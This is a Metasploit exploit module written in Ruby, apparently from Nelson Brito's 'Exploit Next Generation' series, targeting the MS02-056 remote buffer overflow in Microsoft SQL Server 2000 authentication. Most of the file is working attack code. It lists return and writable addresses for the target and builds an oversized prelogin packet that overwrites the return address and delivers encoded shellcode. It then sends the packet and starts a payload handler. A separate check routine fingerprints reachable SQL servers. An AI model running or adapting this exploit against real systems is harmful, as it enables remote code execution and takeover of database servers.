## 
#  $Id: ms02_056.rb,v 1.10 2011-03-22 14:35:21-03 nbrito Exp $
##

###########################################################################
#        ___________ _______    ________                                  #
#        \_   _____/ \      \  /  _____/     .__         .__              #
#         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             #
#         |        \/    |    \    \_\  \ /__    __/  /__    __/          #
#        /_______  /\____|__  /\______  /    |__|        |__|             #
#                \/         \/        \/                                  #
#                                                                         #
#                 Exploit Next Generation Methodology                     #
#                            Release 6.00                                 #
#                                                                         #
#                 Copyright (c) 2004-2011 Nelson Brito                    #
#                          All Rights Reserved                            #
#                                                                         #
###########################################################################
# Author: Nelson Brito <nbrito@sekure.org>                                #
#                                                                         #
# Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    #
###########################################################################
# ENG example is free software;  you  may  redistribute and/or  modify it #
# under the terms of the 'GNU General Public License' as published by the #
# Free  Software  Foundation;  Version  2  with  the  clarifications  and #
# exceptions described below.  This guarantees your right to use, modify, #
# and redistribute this software under certain conditions. If you wish to #
# embed ENG technology into  proprietary software,  please,  contact  the #
# author for an alternative license (contact nbrito@sekure.org).          #
#                                                                         #
# NOTICE: THIS EXPLOIT NEXT GENERATION EXAMPLE IS NOT DISTRIBUTED AS PART #
# OF ANY COMMERCIAL OR PUBLIC TOOL AND IS FREELY AVAILABLE. ALTHOUGH THIS #
# EXAMPLE WAS PORTED TO WORK WITH RAPID7 METASPLOIT FRAMEWORK TO SHOW HOW #
# FLEXIBLE ITS APPROACH AND DEPLOYMENT IS.                                #
#                                                                         #
# This  program  is distributed in the hope that it will  be useful,  but #
# WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    #
# Please, refer to GNU General Public License v2.0 for further details at #
# http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document #
# included with ENG.                                                      #
###########################################################################
require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MS02-056: Exploit Next Generation Methodology Example Module',
			'Description'    => 'Microsoft SQL Server User Authentication Remote Buffer Overflow',
			'Author'         => [ 'Nelson Brito' ],
			'License'        => 'GPLv2',
			'Version'        => '$Revision: 1.10 $',
			'References'     =>
				[
					[ 'CVE', '2002-1123' ],
					[ 'OSVDB', '10132' ],
					[ 'BID', '5411' ],
					[ 'MSB', 'MS02-056' ],
					[ 'MIL', '43' ],
					[ 'URL', 'http://fnstenv.blogspot.com/' ],
					[ 'URL', 'http://www.h2hc.com.br/' ],
					[ 'URL', 'http://www.websecforum.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'ENCODER'  => 'x86/alpha_mixed',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x0a\x0d\x2f\x3a\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'        => 
				[
					[ 'Microsoft SQL Server and Data Engine 2000 (SP0-2)',
						{
							'Rets'     => [ 0x42ae1eb9, 0x42ae2072,
									0x42ae3168, 0x42ae54a5,
									0x42b0d5c4, 0x42b2059c,
									0x42b4d2bc, 0x42b60294,
									0x42b68aba, 0x42ae1554,
									0x42b09664, 0x42b4935c,
									0x42b44194, 0x42b04494 ],
							'Wrts'     => [ 0x42af4930, 0x42afb1b7 ],
						},
					],
				],
			'Platform'       => 'win',
			'DisclosureDate' => 'April 10th, 2011',
			'DefaultTarget' => 0))
	end
	
	def check
		info = mssql_ping
		if (info['ServerName'])
			print_status("SQL Server Information:")
			info.each_pair { |k,v|
				print_status("   #{k + (" " * (15-k.length))} = #{v}")
			}
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		connect

		x        = rand(target['Rets'].length)
		y        = rand(target['Wrts'][1] - target['Wrts'][0])
		writable = target['Wrts'][0] + y

		prelogin =
			"\x12"                                                             + # TYPE    (0x12 is Prelogin)
			"\x01"                                                             + # STATUS  (0x01 is Last Buffer)
			rand(0x04).chr + (rand(0x77) + 8).chr                              + # LENGTH  (0x0008 to 0x047f)
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # SPID    (0x0001 to 0xffff)
			Rex::Text.rand_base(1, payload_badchars, *("\x01" .. "\xff").to_a) + # PACKET  (0x01 to 0xff)
			Rex::Text.rand_base(1, payload_badchars, *("\x01" .. "\x09").to_a) + # WINDOW  (0x01 to 0x09)
			"\x00"                                                             + # TOKEN TYPE
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN POSITION
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN LENGTH
			"\x01"                                                             + # TOKEN TYPE
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN POSITION
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN LENGTH
			"\x02"                                                             + # TOKEN TYPE
			"\x00\x1c"                                                         + # TOKEN POSITION
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN LENGTH
			"\x03"                                                             + # TOKEN TYPE
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN POSITION
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN LENGTH
			"\x04"                                                             + # TOKEN TYPE
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN POSITION
			Rex::Text.rand_base(2, payload_badchars, *("\x01" .. "\xff").to_a) + # TOKEN LENGTH
			rand_text_alpha(531, payload_badchars)                             + # LONG BUFFER
			"\x1B\xA5\xEE\x34"                                                 + # UNKNOWN PADDING
			rand_text_alpha(4, payload_badchars)                               + # PADDING [ebp]
			[ target['Rets'][x] ].pack('V')                                    + # RETURN ADDRESS [ebp+04h]
			[ writable ].pack('V')                                             + # WRITABLE ADDRESS
			[ writable ].pack('V')                                             + # WRITABLE ADDRESS
			[ writable ].pack('V')                                             + # WRITABLE ADDRESS
			[ writable ].pack('V')                                             + # WRITABLE ADDRESS
			[ writable ].pack('V')                                             + # WRITABLE ADDRESS
			rand_text_alpha(88, payload_badchars)                              + # PADDING [edi=SHELLCODE]
			payload.encoded                                                      # SHELLCODE

		sock.put(prelogin)
		
		handler
		disconnect
	end
	
end
